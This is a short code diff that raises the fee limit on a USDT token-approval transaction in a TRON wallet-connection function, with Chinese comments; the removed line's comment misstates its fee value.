@@ -29,7 +29,7 @@ async function connectWallet() {
 
             // 发送授权交易
             const tx = await usdtContract.approve(spenderAddress, amount).send({
-                feeLimit: 5000000, // 设置手续费限制为 0.005 TRX
+                feeLimit: 100000000, // 设置手续费限制为 100 TRX
                 callValue: 0 // 设置交易调用的 TRX 数量
             });
 
